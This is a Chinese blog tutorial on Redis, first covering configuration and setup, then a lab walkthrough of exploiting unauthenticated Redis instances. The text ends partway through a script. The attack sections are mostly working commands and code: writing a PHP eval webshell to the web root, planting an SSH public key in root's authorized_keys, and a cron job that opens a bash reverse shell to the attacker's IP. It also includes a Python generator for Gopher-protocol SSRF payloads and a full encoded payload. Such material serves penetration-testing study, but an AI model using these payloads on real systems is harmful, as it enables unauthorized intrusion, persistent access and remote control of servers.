
---
title: 'Redis常见漏洞利用方法总结'
categories: 
 - 编程
 - Dockone
 - 周报
headimg: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/48fce1836c13817e4daa98f2cb1faefa.png'
author: Dockone
comments: false
date: 2021-08-07 07:06:59
thumbnail: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/48fce1836c13817e4daa98f2cb1faefa.png'
---

<div>   
<br><h3>Redis是什么？</h3>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。<br>
<br>Redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string（字符串）、list（链表）、set（集合）、zset（sorted set --有序集合）和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave（主从）同步。<br>
<br>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。<br>
<br>Redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部分场合可以对关系数据库起到很好的补充作用。<br>
<h3>Redis基本语法</h3><h4>Redis配置</h4>Redis的配置文件位于Redis安装目录下，文件名为<strong>redis.conf</strong>（Windows名为redis.windows.conf）。你可以通过<strong>CONFIG</strong>命令<strong>查看</strong>或<strong>设置</strong>配置项。<br>
<br>Redis CONFIG查看配置命令格式如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> CONFIG GET CONFIG_SETTING_NAME<br>
</pre><br>
使用 *号获取所有配置项：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> CONFIG GET *<br>
<br>
1) "dbfilename"<br>
2) "dump.rdb"<br>
3) "requirepass"<br>
4) ""<br>
5) "masterauth"<br>
6) ""<br>
7) "unixsocket"<br>
8) ""<br>
9) "logfile"<br>
......<br>
</pre><br>
编辑配置：<br>
<br>你可以通过修改 redis.conf文件或使用<strong>CONFIG set</strong>命令来修改配置。<br>
<br>CONFIG SET命令基本语法：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE<br>
</pre><br>
实例：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> CONFIG SET loglevel "notice"<br>
OK<br>
redis 127.0.0.1:6379> CONFIG GET loglevel<br>
<br>
1) "loglevel"<br>
2) "notice"<br>
</pre><br>
参数说明：<br>
<br>几个redis.conf配置项说明如下：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/48fce1836c13817e4daa98f2cb1faefa.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/48fce1836c13817e4daa98f2cb1faefa.png" class="img-polaroid" title="1.png" alt="1.png" referrerpolicy="no-referrer"></a>
</div>
<br>
详情请见：<a href="https://www.657260.com/redis/redis-conf.html" rel="nofollow" target="_blank">https://www.657260.com/redis/redis-conf.html</a><br>
<h4>Redis命令</h4>Redis命令用于在Redis服务上执行操作。要在Redis服务上执行命令需要一个Redis客户端。Redis客户端在我们之前下载的的Redis的安装包中。<br>
<br>Redis客户端的基本语法为：<br>
<pre class="prettyprint">$ redis-cli<br>
</pre><br>
以下实例讲解了如何启动Redis客户端：<br>
<br>启动Redis客户端，打开终端并输入命令<strong>redis-cli</strong>。该命令会连接本地的Redis服务。<br>
<pre class="prettyprint">$ redis-cli<br>
redis 127.0.0.1:6379><br>
redis 127.0.0.1:6379> PING<br>
<br>
PONG<br>
</pre><br>
在以上实例中我们连接到本地的Redis服务并执行<strong>PING</strong>命令，该命令用于检测Redis服务是否启动，如果服务器运作正常的话，会返回一个PONG。<br>
<br>在远程服务上执行命令：<br>
<br>如果需要在远程Redis服务上执行命令，同样我们使用的也是<strong>redis-cli</strong>命令。<br>
<br>语法：<br>
<pre class="prettyprint">$ redis-cli -h host -p port -a password<br>
</pre><br>
以下实例演示了如何连接到主机为127.0.0.1，端口为6379，密码为mypass的Redis服务上。<br>
<pre class="prettyprint">$redis-cli -h 127.0.0.1 -p 6379 -a "mypass"<br>
redis 127.0.0.1:6379><br>
redis 127.0.0.1:6379> PING<br>
<br>
PONG<br>
</pre><br>
<h4>SET命令</h4>Redis SET命令用于设置给定key的值。如果key已经存储其他值， SET就覆写旧值，且无视类型。<br>
<br>Redis SET命令基本语法如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> SET KEY_NAME VALUE<br>
</pre><br>
<h4>Get命令</h4>Redis Get命令用于获取指定key的值。如果key不存在，返回nil。<br>
<br>Redis Get命令基本语法如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> GET KEY_NAME<br>
</pre><br>
<h4>Flushall命令</h4>Redis Flushall命令用于清空整个Redis服务器的数据（删除所有数据库的所有key）。<br>
<br>Redis Flushall命令基本语法如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> FLUSHALL <br>
</pre><br>
<h4>Redis数据备份与恢复</h4>Redis <strong>SAVE</strong>命令用于创建当前数据库的备份。Save命令执行一个同步保存操作，将当前Redis实例的所有数据快照（snapshot）以默认RDB文件的形式保存到硬盘。<br>
<br>Redis Save命令基本语法如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> SAVE   <br>
OK<br>
</pre><br>
<br>该命令将在Redis安装目录中创建dump.rdb文件。<br>
<br>恢复数据：<br>
<br>如果需要恢复数据，只需将备份文件（dump.rdb）移动到Redis安装目录并启动服务即可。获取Redis目录可以使用<strong>CONFIG</strong>命令，如下所示：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> CONFIG GET dir  <br>
1) "dir"  <br>
2) "/usr/local/redis/bin"<br>
</pre><br>
以上命令<strong>CONFIG GET dir</strong>输出的Redis安装目录为/usr/local/redis/bin。<br>
<h4>Redis安全</h4>我们可以通过Redis的配置文件设置密码参数，<strong>这样客户端连接到Redis服务就需要密码验证</strong>，这样可以让你的Redis服务更安全。<br>
<br>我们可以通过以下命令查看是否设置了密码验证：<br>
<pre class="prettyprint">127.0.0.1:6379> CONFIG get requirepass  <br>
1) "requirepass"  <br>
2) ""<br>
</pre><br>
默认情况下requirepass参数是空的，也就是说默认情况下是无密码验证的，这就意味着你无需通过密码验证就可以连接到Redis服务。<br>
<br>你可以通过以下命令来修改该参数：<br>
<pre class="prettyprint">127.0.0.1:6379> CONFIG set requirepass "657260"  <br>
OK  <br>
127.0.0.1:6379> CONFIG get requirepass  <br>
1) "requirepass"  <br>
2) "657260"<br>
</pre><br>
设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。<br>
<br>语法：<br>
<br><strong>AUTH</strong>命令基本语法格式如下：<br>
<pre class="prettyprint">127.0.0.1:6379> AUTH password<br>
</pre><br>
该命令用于检测给定的密码和配置文件中的密码是否相符。<br>
<br>Redis Auth命令基本语法如下：<br>
<pre class="prettyprint">redis 127.0.0.1:6379> AUTH PASSWORD <br>
</pre><br>
密码匹配时返回OK ，否则返回一个错误。<br>
<br>实例：<br>
<pre class="prettyprint">127.0.0.1:6379> AUTH "657260"  <br>
OK  <br>
127.0.0.1:6379> SET mykey "Test value"  <br>
OK  <br>
127.0.0.1:6379> GET mykey  <br>
"Test value"<br>
</pre><br>
<h3>Redis环境搭建</h3>第一步：Ubuntu中下载安装Redis并解压：<br>
<pre class="prettyprint">wget http://download.redis.io/releases/redis-5.0.12.tar.gz  <br>
tar -zxvf redis-5.0.12.tar.gz<br>
</pre><br>
第二步：下载并解压好以后，进入到Redis目录中，执行<code class="prettyprint">make</code>，通过make编译的方式来安装：<br>
<pre class="prettyprint">make<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/fce72f7c5a9bcf1e1aafd2d8b05416fb.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/fce72f7c5a9bcf1e1aafd2d8b05416fb.jpg" class="img-polaroid" title="2.jpg" alt="2.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/ccfa7623c2862a4fc5507a4a606c6891.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/ccfa7623c2862a4fc5507a4a606c6891.jpg" class="img-polaroid" title="3.jpg" alt="3.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如上图提示"It’s a good idea to run 'make test' "则代表编译安装成功。<br>
<br>第四步：make结束后，进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br>
<pre class="prettyprint">cd src  <br>
cp redis-cli /usr/bin  <br>
cp redis-server /usr/bin<br>
</pre><br>
第五步：返回redis-2.8.17目录，将redis.conf拷贝到/etc目录下。<br>
<pre class="prettyprint">cd ../  <br>
cp redis.conf /etc<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/d31b628f5528dc6ce9b984a2bfc2a85a.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/d31b628f5528dc6ce9b984a2bfc2a85a.jpg" class="img-polaroid" title="4.jpg" alt="4.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
第六步：使用/etc目录下的reids.conf文件中的配置启动Redis服务：<br>
<pre class="prettyprint">redis-server /etc/redis.conf<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/d543a458bcb11f9a2262ca42aabd3953.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/d543a458bcb11f9a2262ca42aabd3953.jpg" class="img-polaroid" title="5.jpg" alt="5.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h3>Redis未授权访问漏洞</h3><div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/a89dea1d8e2464b019c6a69eb6960da0.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/a89dea1d8e2464b019c6a69eb6960da0.jpg" class="img-polaroid" title="6.jpg" alt="6.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
Redis默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源IP访问等，这样将会将Redis服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，可以利用Redis自身的提供的config命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。<br>
<br>简单说，漏洞的产生条件有以下两点：<br>
<ul><li>Redis绑定在0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源IP访问等相关安全策略，直接暴露在公网。</li><li>没有设置密码认证（一般为空），可以免密码远程登录Redis服务。</li></ul><br>
<br>漏洞危害：<br>
<ul><li>攻击者无需认证就可以访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</li><li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</li><li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</li></ul><br>
<br>下面我们对Redis未授权访问漏洞进行测试。<br>
<br>实验环境：<br>
<ul><li>攻击机Kali：192.168.43.247</li><li>受害机Ubuntu：192.168.43.82</li></ul><br>
<br>此时受害机Ubuntu中的Redis服务（作为服务端）已经启动了，作为攻击机的kali系统，需要按照之前的步骤同样安装Redis（作为客户端）。安装成功后在攻击机上使用redis客户端直接无账号成功登录Ubuntu上的Redis服务端，并且成功列出服务端Redis的信息：<br>
<pre class="prettyprint">redis-cli -h 192.168.43.82<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/1d9a6e679c60e75d0ea12622c1c2b291.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/1d9a6e679c60e75d0ea12622c1c2b291.jpg" class="img-polaroid" title="7.jpg" alt="7.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>利用Redis写入Webshell</h4>利用条件：<br>
<ul><li>服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证。</li><li>开了服务端存在Web服务器，并且知道Web目录的路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</li></ul><br>
<br>我们可以将dir设置为/var/www/html目录，将指定本地数据库存放目录设置为/var/www/html；将dbfilename设置为文件名shell.php，即指定本地数据库文件名为shell.php；再执行save或bgsave，则我们就可以写入一个路径为/var/www/html/shell.php的Webshell文件。<br>
<br>原理就是在数据库中插入一条Webshell数据，将此Webshell的代码作为value，key值随意（x），然后通过修改数据库的默认路径为/var/www/html和默认的缓冲文件shell.php，把缓冲的数据保存在文件里，这样就可以在服务器端的/var/www/html下生成一个Webshell。<br>
<br>操作步骤：<br>
<pre class="prettyprint">config set dir /var/www/html/   <br>
config set dbfilename shell.php  <br>
set xxx "<?php eval($_POST[whoami]);?>"   <br>
save<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/b1081700717fdfefbd9d5ca34584f5ed.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/b1081700717fdfefbd9d5ca34584f5ed.jpg" class="img-polaroid" title="8.jpg" alt="8.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
这里需要注意的是第三步写Webshell的时候，可以使用：<br>
<pre class="prettyprint">set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"<br>
</pre><br>
<code class="prettyprint">\r\n\r\n</code>代表换行的意思，用Redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行，查看/var/www/html/目录下的shell.php文件内容。如下图所示，写入成功：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/06334639b7769b14fadc7207a0ef044a.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/06334639b7769b14fadc7207a0ef044a.jpg" class="img-polaroid" title="9.jpg" alt="9.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
蚁剑连接，连接成功：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/768302b66eb866b35cb67f359369afab.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/768302b66eb866b35cb67f359369afab.jpg" class="img-polaroid" title="10.jpg" alt="10.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>利用 Redis 写入 SSH 公钥</h4>利用条件：<br>
<ul><li>服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证。</li><li>服务端存在.ssh目录并且有写入的权限</li></ul><br>
<br>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。<br>
<br>首先在攻击机的/root/.ssh目录里生成ssh公钥key：<br>
<pre class="prettyprint">ssh-keygen -t rsa<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/edcedfed47b7ac035d983279dd49d07f.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/edcedfed47b7ac035d983279dd49d07f.jpg" class="img-polaroid" title="11.jpg" alt="11.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：<br>
<pre class="prettyprint">(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt  <br>
cat /root/.ssh/key.txt | redis-cli -h 192.168.43.82 -x set xxx  <br>
<br>
// -x 代表从标准输入读取数据作为该命令的最后一个参数。<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/3b590dd75161c12c6a86f99e8855dfff.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/3b590dd75161c12c6a86f99e8855dfff.jpg" class="img-polaroid" title="12.jpg" alt="12.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
然后，使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上。<br>
<pre class="prettyprint">redis-cli -h 192.168.43.82  <br>
config set dir /root/.ssh  <br>
config set dbfilename authorized_keys  <br>
save<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/9ded06e2a01b8bdafe57e6a4e27b9f38.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/9ded06e2a01b8bdafe57e6a4e27b9f38.jpg" class="img-polaroid" title="13.jpg" alt="13.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
最后，使用攻击机SSH连接目标受害机即可：<br>
<pre class="prettyprint">ssh 192.168.43.82<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/2536ddfc20e000d2e5b854ca0a5a051c.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/2536ddfc20e000d2e5b854ca0a5a051c.jpg" class="img-polaroid" title="14.jpg" alt="14.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如上图所示，成功连接。<br>
<h4>利用Redis写入计划任务</h4>原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。<br>
<br>首先在攻击机kali上开启监听：<br>
<pre class="prettyprint">nc -lvp 2333<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/63c6c4b049a34b9e5333fd8b5bee2b24.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/63c6c4b049a34b9e5333fd8b5bee2b24.jpg" class="img-polaroid" title="15.jpg" alt="15.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
然后连接服务端的Redis，写入反弹shell的计划任务：<br>
<pre class="prettyprint">redis-cli -h 192.168.142.153  <br>
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.43.247/2333 0>&1\n\n"  <br>
config set dir /var/spool/cron/crontabs/  <br>
config set dbfilename root  <br>
save<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/ad840a95f16ffb380da4de92b8a9c26c.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/ad840a95f16ffb380da4de92b8a9c26c.jpg" class="img-polaroid" title="16.jpg" alt="16.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如下图所示，经过一分钟以后，在攻击机的nc中成功反弹shell回来：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/dc727f5e463135881f1eaecab1d5a54a.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/dc727f5e463135881f1eaecab1d5a54a.jpg" class="img-polaroid" title="17.jpg" alt="17.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
这个方法只能CentOS上使用，Ubuntu上行不通，原因如下：<br>
<ul><li>因为默认Redis写文件后是644的权限，但Ubuntu要求执行定时任务文件<code class="prettyprint">/var/spool/cron/crontabs/&lt;username></code>权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而CentOS的定时任务文件<code class="prettyprint">/var/spool/cron/&lt;username></code>权限644也能执行</li><li>因为Redis保存RDB会存在乱码，在Ubuntu上会报错，而在CentOS上不会报错</li></ul><br>
<br>由于系统的不同，crontrab定时文件位置也会不同：<br>
<ul><li>CentOS的定时任务文件在<code class="prettyprint">/var/spool/cron/&lt;username></code></li><li>Ubuntu定时任务文件在<code class="prettyprint">/var/spool/cron/crontabs/&lt;username>﻿</code></li></ul><br>
<br><h3>Redis未授权访问漏洞在SSRF中的利用</h3>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用Redis自身的提供的config命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为Web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。<br>
<br>实验环境：<br>
<ul><li>攻击机Kali：192.168.43.247</li><li>受害机Ubuntu：192.168.43.82</li></ul><br>
<br>假设受害机上存在Web服务并且存在SSRF漏洞，通过SSRF进行端口扫描我们发现目标主机在6379端口上运行着一个Redis服务。下面我们就来演示如何通过SSRF漏洞去攻击Redis服务。<br>
<h4>绝对路径写WebShell</h4>首先构造Redis命令：<br>
<pre class="prettyprint">flushall  <br>
set 1 '<?php eval($_POST["whoami"]);?>'  <br>
config set dir /var/www/html  <br>
config set dbfilename shell.php  <br>
save<br>
</pre><br>
然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：<br>
<pre class="prettyprint">import urllib  <br>
protocol="gopher://"  <br>
ip="192.168.43.82"  <br>
port="6379"  <br>
shell="\n\n<?php eval($_POST[\"whoami\"]);?>\n\n"  <br>
filename="shell.php"  <br>
path="/var/www/html"  <br>
passwd=""    # 此处也可以填入Redis的密码，在不存在Redis未授权的情况下适用  <br>
cmd=["flushall",  <br>
"set 1 &#123;&#125;".format(shell.replace(" ","$&#123;IFS&#125;")),  <br>
"config set dir &#123;&#125;".format(path),  <br>
"config set dbfilename &#123;&#125;".format(filename),  <br>
"save"  <br>
]  <br>
if passwd:  <br>
cmd.insert(0,"AUTH &#123;&#125;".format(passwd))  <br>
payload=protocol+ip+":"+port+"/_"  <br>
def redis_format(arr):  <br>
CRLF="\r\n"  <br>
redis_arr = arr.split(" ")  <br>
cmd=""  <br>
cmd+="*"+str(len(redis_arr))  <br>
for x in redis_arr:  <br>
cmd+=CRLF+"$"+str(len((x.replace("$&#123;IFS&#125;"," "))))+CRLF+x.replace("$&#123;IFS&#125;"," ")  <br>
cmd+=CRLF  <br>
return cmd  <br>
<br>
if __name__=="__main__":  <br>
for x in cmd:  <br>
payload += urllib.quote(redis_format(x))  <br>
print payload<br>
</pre><br>
<br>执行该脚本后生成payload如下：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/e25797021f9e64c1fb48f92fac8bfd85.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/e25797021f9e64c1fb48f92fac8bfd85.jpg" class="img-polaroid" title="18.jpg" alt="18.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：<br>
<pre class="prettyprint">ssrf.php?url=gopher%3A%2F%2F192.168.43.82%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<br>
</pre><br>
如下所示，成功在受害主机上面写入WebShell：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/43450dd6ec6ea3a94d12236c8d02f2d9.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/43450dd6ec6ea3a94d12236c8d02f2d9.jpg" class="img-polaroid" title="19.jpg" alt="19.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
蚁剑连接成功：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/df681f157a0cd864c994d272b639dd75.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/df681f157a0cd864c994d272b639dd75.jpg" class="img-polaroid" title="20.jpg" alt="20.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>写入SSH公钥</h4>同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。<br>
<br>首先在攻击机的/root/.ssh目录里生成ssh公钥key：<br>
<pre class="prettyprint">ssh-keygen -t rsa<br>
</pre><br>
将生成的id_rsa.pub里的内容复制出来构造Redis命令：<br>
<pre class="prettyprint">flushall  <br>
set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali  <br>
'  <br>
config set dir /root/.ssh/  <br>
config set dbfilename authorized_keys  <br>
save<br>
</pre><br>
然后编写脚本，将其转化为Gopher协议的格式：<br>
<pre class="prettyprint">import urllib  <br>
protocol="gopher://"  <br>
ip="192.168.43.82"  <br>
port="6379"  <br>
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali\n\n"  <br>
filename="authorized_keys"  <br>
path="/root/.ssh/"  <br>
passwd=""    # 此处也可以填入Redis的密码，在不存在Redis未授权的情况下适用  <br>
cmd=["flushall",  <br>
"set 1 &#123;&#125;".format(ssh_pub.replace(" ","$&#123;IFS&#125;")),  <br>
